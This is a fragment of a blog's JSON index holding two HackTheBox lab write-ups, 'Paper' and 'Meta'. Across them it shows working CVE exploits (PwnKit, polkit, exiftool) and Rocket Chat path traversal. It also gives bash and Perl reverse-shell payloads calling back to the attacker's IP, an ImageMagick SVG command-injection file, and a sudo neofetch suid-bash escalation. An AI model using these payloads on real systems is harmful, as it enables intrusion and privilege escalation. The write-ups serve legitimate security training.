    "content": "UserPaper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installation. In rocket chat a bot is vulnerable to LFI which gets us a password that is reused for the user dwight. In the root stage we will go over the unintended method of using pkexec and the intended one of abusing polkit to add another user with sudo rights and root the machine.NmapAs usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.All ports$ sudo nmap -n -p- -T4 10.129.158.20Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 20:52 CETNmap scan report for 10.129.158.20Host is up (0.028s latency).Not shown: 65528 closed tcp ports (reset)PORT      STATE    SERVICE22/tcp    open     ssh80/tcp    open     http443/tcp   open     httpsNmap done: 1 IP address (1 host up) scanned in 1130.89 secondsScript and Version$ sudo nmap -n -sC -sV -p22,80,443 10.129.158.20Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 21:14 CETNmap scan report for 10.129.158.20Host is up (0.033s latency).PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)| ssh-hostkey:|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_http-title: HTTP Server Test Page powered by CentOS|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after:  2022-07-08T10:32:34|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9|_http-title: 400 Bad Request| http-methods:|_  Potentially risky methods: TRACE|_ssl-date: TLS randomness does not represent time| tls-alpn:|_  http/1.1Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.95 secondsWordpress draftFrom the open ports http and https seem to be most promising. Opening port 80 in our browser we see the the Centos http server test page.Intercepting a request in burp and looking at the response headers in repeater we can find that it leaks the vhost office.paper which we add to our /etc/hosts file.Opening http://office.paper in our browser we see a wordpress blog.Scanning the page using wpscan we can identify the version to be 5.3 and thus out of date.$ wpscan --url http://office.paper/  -e u...[snip]...[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05). | Found By: Rss Generator (Passive Detection) |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt; |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;...[snip]...[i] User(s) Identified:[+] prisonmike | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Rss Generator (Passive Detection) |  Wp Json Api (Aggressive Detection) |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] nick | Found By: Wp Json Api (Aggressive Detection) |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] creedthoughts | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sat Feb  5 21:35:30 2022[+] Requests Done: 58[+] Cached Requests: 6[+] Data Sent: 15.658 KB[+] Data Received: 254.476 KB[+] Memory used: 175.559 MB[+] Elapsed time: 00:00:10Checking for vulnerabilities in the installed version we find this describing an easy way to leak drafts. Using it as described with asc sorting it we get an error, however changing it to desc we get a draft leaking a rocket chat installation with the secret registration url.Rocket chat LFIAfter adding chat.office.paper to our /etc/hosts aswell and opening the registration link in our browser we are able to register an account on rocket chat.Once logged in with the created account there is an interesting discussion in general where we see some bot functionality. Especially the file retrieval seems to be interesting.Starting a private conversation with the bot and testing if we can go back to the file system root with ../ it works and we are able to retrieve the /etc/passwd file.Checking the environment parameters of rocket chat with  recyclops file ../../../../proc/self/environ we find the installation is running from the user dwight’s home directory and we also get the password.Testing for password reuse over ssh we are able to log into the machine and grab the user flag.$ ssh dwight@office.paperdwight@office.paper's password:Activate the web console with: systemctl enable --now cockpit.socketLast login: Tue Feb  1 09:14:33 2022 from 10.10.14.23[dwight@paper ~]$ wc -c user.txt33 user.txtRootpkexecUntil some time after release there was an unintended way to obtain root abusing a vulnerable pkexec version.Checking for suid binaries we can see that pkexec is installed on the machine.[dwight@paper ~]$ find / -perm -4000 2&gt;/dev/null/usr/bin/fusermount/usr/bin/chage/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/mount/usr/bin/su/usr/bin/umount/usr/bin/crontab/usr/bin/pkexec/usr/bin/passwd/usr/bin/chfn/usr/bin/chsh/usr/bin/at/usr/bin/sudo/usr/bin/fusermount3/usr/sbin/grub2-set-bootflag/usr/sbin/pam_timestamp_check/usr/sbin/unix_chkpwd/usr/sbin/userhelper/usr/sbin/mount.nfs/usr/lib/polkit-1/polkit-agent-helper-1/usr/libexec/dbus-1/dbus-daemon-launch-helper/usr/libexec/qemu-bridge-helper/usr/libexec/cockpit-session/usr/libexec/sssd/krb5_child/usr/libexec/sssd/ldap_child/usr/libexec/sssd/proxy_child/usr/libexec/sssd/selinux_child/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper/usr/libexec/Xorg.wrapRetrieving it’s version we see it is vulnerable to the recent CVE-2021-4034.[dwight@paper ~]$ pkexec --versionpkexec version 0.115We can use this PoC to exploit pkexec and obtain root on the machine.Since make is installed on the machine we clone the repo tar it up and scp it to the target as dwight.$ git clone https://github.com/luijait/PwnKit-ExploitCloning into 'PwnKit-Exploit'...remote: Enumerating objects: 224, done.remote: Counting objects: 100% (224/224), done.remote: Compressing objects: 100% (224/224), done.remote: Total 224 (delta 119), reused 4 (delta 0), pack-reused 0Receiving objects: 100% (224/224), 64.38 KiB | 4.29 MiB/s, done.Resolving deltas: 100% (119/119), done.$ tar -czf PwnKit-Exploit.tar.gz PwnKit-Exploit$ scp ./PwnKit-Exploit.tar.gz dwight@office.paper:/tmpdwight@office.paper's password:PwnKit-Exploit.tar.gz                                                                                                                                                                                        100%   92KB 791.0KB/s   00:00There we unpack the archive and “make” the binary.[dwight@paper tmp]$ tar -xf PwnKit-Exploit.tar.gz[dwight@paper tmp]$ cd PwnKit-Exploit/[dwight@paper PwnKit-Exploit]$ makecc -Wall    exploit.c   -o exploitRunning the exploit we get dropped into a root shell.[dwight@paper PwnKit-Exploit]$ ./exploitCurrent User before execute exploithacker@victim$whoami: dwightExploit written by @luijait (0x6c75696a616974)[+] Enjoy your root if exploit was completed succesfully[root@paper PwnKit-Exploit]# wc -c /root/root.txt33 /root/root.txtPolkitThe actually intended solution to obtain root on the machine was to abuse polkit. Checking for the installed version we can see that it is vulnerable to CVE-2021-3560.[dwight@paper ~]$ rpm -qa | grep -i polkitpolkit-0.115-6.el8.x86_64polkit-pkla-compat-0.1-12.el8.x86_64polkit-libs-0.115-6.el8.x86_64Using the authors poc script we are able to create a new user with sudo rights and add the root flag to our collection. Note that this exploit is because of its time based nature not completely stable and might need rerunning until it works.[dwight@paper tmp]$ ./poc.sh -u=sm1l3z -p=sm1l3z[!] Username set as : sm1l3z[!] No Custom Timing specified.[!] Timing will be detected Automatically[!] Force flag not set.[!] Vulnerability checking is ENABLED![!] Starting Vulnerability Checks...[!] Checking distribution...[!] Detected Linux distribution as \"centos\"[!] Checking if Accountsservice and Gnome-Control-Center is installed[+] Accounts service and Gnome-Control-Center Installation Found!![!] Checking if polkit version is vulnerable[+] Polkit version appears to be vulnerable!![!] Starting exploit...[!] Inserting Username sm1l3z...Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required[+] Inserted Username sm1l3z  with UID 1006![!] Inserting password hash...[!] It looks like the password insertion was succesful![!] Try to login as the injected user using sudo - sm1l3z[!] When prompted for password, enter your password[!] If the username is inserted, but the login fails; try running the exploit again.[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell![dwight@paper tmp]$ su - sm1l3zPassword:[sm1l3z@paper ~]$ sudo suWe trust you have received the usual lecture from the local SystemAdministrator. It usually boils down to these three things:    #1) Respect the privacy of others.    #2) Think before you type.    #3) With great power comes great responsibility.[sudo] password for sm1l3z:[root@paper sm1l3z]# wc -c /root/root.txt33 /root/root.txt"
  },
  
  {
    "title": "Hack The Box - Meta",
    "url": "/posts/meta/",
    "categories": "HackTheBox",
    "tags": "linux, medium, exfitool, cve, imagemagick, neofetch, sudo",
    "date": "2022-06-11 00:00:00 +0800",
    





    
    "snippet": "Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE i...",
    "content": "Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE inside ImageMagick which will give us a shell as another user. To escalate to root we will modify a config file for neofetch which we are able to run using sudo.UserAs usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.NmapAll ports$ sudo nmap -p- -n -T4 10.129.166.252Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 22:40 CETNmap scan report for 10.129.166.252Host is up (0.027s latency).Not shown: 65532 closed tcp ports (reset)PORT      STATE    SERVICE22/tcp    open     ssh80/tcp    open     httpNmap done: 1 IP address (1 host up) scanned in 529.64 secondsScript and version$ sudo nmap -sC -sV -p22,80 -n 10.129.166.252Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 22:52 CETNmap scan report for 10.129.166.252Host is up (0.029s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)80/tcp open  http    Apache httpd|_http-server-header: Apache|_http-title: Did not follow redirect to http://artcorp.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.73 secondsExfitoolThe nmap scan leaks the hostname artcorp.htb so we add it to our /etc/hosts. Opening the page up in our browser it looks like a completly static webpage without much functionality.Checking for additional vhosts using ffuf we are able to find dev01.artcorp.htb which we also add to our /etc/hosts.$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.artcorp.htb' -u http://10.129.166.252 -fs 0        /'___\\  /'___\\           /'___\\       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\          \\/_/    \\/_/   \\/___/    \\/_/       v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://10.129.166.252 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header           : Host: FUZZ.artcorp.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 0________________________________________________dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10]Going there we see a development page with only one application available.Clicking on MetaView there is a file upload form which tells us to upload an image to display metadata.Uploading a test jpg the output looks like straight from exiftool.There has been a recent CVE(CVE-2021-22204)with remote code execution in exiftool. Using this PoC where we only have to adjust our ip address to tun0 and the port to where we want to catch the reverse shell we can generate an image that sends a python reverse shell back to our machine.exploit.py#!/bin/env python3import base64import subprocessip = '10.10.14.73'port = '7575'payload = b\"(metadata \\\"\\c${use MIME::Base64;eval(decode_base64('\"payload = payload + base64.b64encode( f\"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}'))));\".encode() )payload = payload + b\"'))};\\\")\"payload_file = open('payload', 'w')payload_file.write(payload.decode('utf-8'))payload_file.close()subprocess.run(['bzz', 'payload', 'payload.bzz'])subprocess.run(['djvumake', 'exploit.djvu', \"INFO=1,1\", 'BGjp=/dev/null', 'ANTz=payload.bzz'])subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif&lt;=exploit.djvu', 'image.jpg'])Running the script the image is getting updated with the payload.$ python3 exploit.py    1 image files updatedNow we just have to set up a listener on the port we specified and upload the generated image to the website.$ nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:7575After we click the upload button the page hangs and we get a connection back on our ncat listener as www-data which we upgrade using python and fix the terminal size.$ nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:7575Ncat: Connection from 10.129.166.252.Ncat: Connection from 10.129.166.252:43968./bin/sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xtermexport TERM=xtermwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z[1]  + 43617 suspended  nc -lnvp 7575$ stty raw -echo;fg[1]  + 43617 continued  nc -lnvp 7575www-data@meta:/var/www/dev01.artcorp.htb/metaview$ImageMagickTaking a look around on the system and monitoring for running processes there seems to be a cronjob being run by the user thomas who has the uid of 1000.2022/01/22 17:13:01 CMD: UID=0    PID=1441   | /usr/sbin/CRON -f2022/01/22 17:13:01 CMD: UID=1000 PID=1442   | /bin/bash /usr/local/bin/convert_images.sh2022/01/22 17:13:01 CMD: UID=1000 PID=1444   | pkill mogrifyChecking the script it cd’s into the directory /var/www/dev01.artcorp.htb/convert_images and then calls /usr/local/bin/mogrify on all files machting *.* with an output format of png./usr/local/bin/convert_images.sh#!/bin/bashcd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/nullpkill mogrifyTaking a closer look at the mogrify it is actually a symlink to magick which is part of ImageMagick.www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /usr/local/bin/mogrifylrwxrwxrwx 1 root root 6 Aug 29 15:59 /usr/local/bin/mogrify -&gt; magickTo check for possible CVE’s in ImageMagick we need the version number first.www-data@meta:/var/www/dev01.artcorp.htb/metaview$ mogrify --versionVersion: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.orgCopyright: © 1999-2020 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5)Delegates (built-in): fontconfig freetype jng jpeg png x xml zlibLooking the version up on google we are able to find a PoC which should work with the installed version of ImageMagick. The PoC abuses the the authentication mechanism for password protected PDF’s to pass additional shell commands. To abuse this we first we generate a base64 encoded  reverse shell payload.$ echo -n 'bash -c \"bash -i &gt;&amp;/dev/tcp/10.10.14.73/7575 0&gt;&amp;1\"' | base64YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjczLzc1NzUgMD4mMSI=We then take the poc.svg from the blogpost and exchange the payload with our reverse shell.poc.svg&lt;image authenticate='ff\" `echo -n YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjczLzc1NzUgMD4mMSI= | base64 -d | bash`;\"'&gt;  &lt;read filename=\"pdf:/etc/passwd\"/&gt;  &lt;get width=\"base-width\" height=\"base-height\" /&gt;  &lt;resize geometry=\"400x400\" /&gt;  &lt;write filename=\"test.png\" /&gt;  &lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt;  &lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/&gt;  &lt;/svg&gt;&lt;/image&gt;All we have to do now is to set up a ncat listener and to drop the file in the /var/www/dev01.artcorp.htb/convert_images on the target machine.nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:757www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ wget 10.10.14.73/poc.svg -O poc.svg--2022-01-22 17:18:46--  http://10.10.14.73/poc.svgConnecting to 10.10.14.73:80... connected.HTTP request sent, awaiting response... 200 OKLength: 475 [image/svg+xml]Saving to: ‘poc.svg’poc.svg                                                     100%[==========================================================================================================================================&gt;]     475  --.-KB/s    in 0s2022-01-22 17:18:46 (55.3 MB/s) - ‘poc.svg’ saved [475/475]www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -latotal 12drwxrwxr-x 2 root     www-data 4096 Jan 22 17:18 .drwxr-xr-x 4 root     root     4096 Oct 18 14:27 ..-rw-r--r-- 1 www-data www-data  475 Jan 22 15:08 poc.svgAfter some time we get a connection back as thomas and are able to read the user flag.$ nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:7575Ncat: Connection from 10.129.166.252.Ncat: Connection from 10.129.166.252:43978.bash: cannot set terminal process group (1533): Inappropriate ioctl for devicebash: no job control in this shellthomas@meta:/var/www/dev01.artcorp.htb/convert_images$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'&lt;ges$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ export TERM=xtermexport TERM=xtermthomas@meta:/var/www/dev01.artcorp.htb/convert_images$ ^Z[1]  + 45412 suspended  nc -lnvp 7575$ stty raw -echo;fg[1]  + 45412 continued  nc -lnvp 7575                                                       ^Cthomas@meta:/var/www/dev01.artcorp.htb/convert_images$ stty rows 57 cols 239thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ wc -c ~/user.txt33 /home/thomas/user.txtRootChecking for sudo permission thomas is able to run /usr/bin/neofetch as the root user. An interesting point here is the env_keep+=XDG_CONFIG_HOME flag for the sudoers entry.env_keep means that this environment variable will not be reset when calling sudo even though env_reset is present aswell.thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ sudo -lMatching Defaults entries for thomas on meta:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOMEUser thomas may run the following commands on meta:    (root) NOPASSWD: /usr/bin/neofetch \\\"\\\"To see what we can do with this we can look for the variable in the source code of neofetch. The variable is used to declare the configuration directory of neovim. The interesting thing here is that the configuration file for neoftech get’s sourced. This means that anything we put into the configuration file will be eventually executed setting the XDG_CONFIG_HOME./usr/bin/neofetch#!/usr/bin/env bash# vim: noai:ts=4:sw=4:expandtab# shellcheck source=/dev/null# shellcheck disable=2009...[snip]...version=\"6.0.0\"bash_version=\"${BASH_VERSION/.*}\"sys_locale=\"${LANG:-C}\"XDG_CONFIG_HOME=\"${XDG_CONFIG_HOME:-${HOME}/.config}\"PATH=\"${PATH}:/usr/xpg4/bin:/usr/sbin:/sbin:/usr/etc:/usr/libexec\"...[snip]...get_user_config() {    mkdir -p \"${XDG_CONFIG_HOME}/neofetch/\"    # --config /path/to/config.conf    if [[ -f \"$config_file\" ]]; then        source \"$config_file\"        err \"Config: Sourced user config. (${config_file})\"        return    elif [[ -f \"${XDG_CONFIG_HOME}/neofetch/config.conf\" ]]; then        source \"${XDG_CONFIG_HOME}/neofetch/config.conf\"        err \"Config: Sourced user config.    (${XDG_CONFIG_HOME}/neofetch/config.conf)\"    elif [[ -f \"${XDG_CONFIG_HOME}/neofetch/config\" ]]; then        source \"${XDG_CONFIG_HOME}/neofetch/config\"        err \"Config: Sourced user config.    (${XDG_CONFIG_HOME}/neofetch/config)\"    else        config_file=\"${XDG_CONFIG_HOME}/neofetch/config.conf\"        # The config file doesn't exist, create it.        printf '%s\\n' \"$config\" &gt; \"$config_file\"    fi}...[snip]...dynamic_prompt() {    [[ $image_backend == off ]]   &amp;&amp; { printf '\\n'; return; }    [[ $image_backend != ascii ]] &amp;&amp; ((lines=(height + yoffset) / font_height + 1))    [[ $image_backend == w3m ]] &amp;&amp; ((lines=lines + padding / font_height + 1))--    [[ \"$*\" != *--config* ]] &amp;&amp; get_user_config...[snip]...To abuse this we can simply append a command setting the suid bit on bash to the config file, export the XDG_CONFIG_HOME variable and run neofetch with sudo. Finally we can use the -p flag on bash to keep the suid permissions on our modified bash and add the root flag to our collection.thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ echo 'chmod +s /bin/bash' &gt;&gt; /home/thomas/.config/neofetch/config.conf; export XDG_CONFIG_HOME=/home/thomas/.config/; sudo /usr/bin/neofetch; bash -p       _,met$$$$$gg.          root@meta    ,g$$$$$$$$$$$$$$$P.       ---------  ,g$$P\"     \"\"\"Y$$.\".        OS: Debian GNU/Linux 10 (buster) x86_64 ,$$P'              `$$$.     Host: VMware Virtual Platform None',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64`d$$'     ,$P\"'   .    $$$    Uptime: 52 mins $$P      d$'     ,    $$P    Packages: 495 (dpkg) $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 $$;      Y$b._   _,d$P'      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz Y$$.    `.`\"Y$$$$P\"'         GPU: VMware SVGA II Adapter `$$b      \"-.__              Memory: 154MiB / 1994MiB  `Y$$   `Y$$.     `$$b.       `Y$$b.          `\"Y$b._              `\"\"\"bash-5.0# iduid=1000(thomas) gid=1000(thomas) euid=0(root) egid=0(root) groups=0(root),1000(thomas)bash-5.0# wc -c /root/root.txt33 /root/root.txt"
  }
  
]

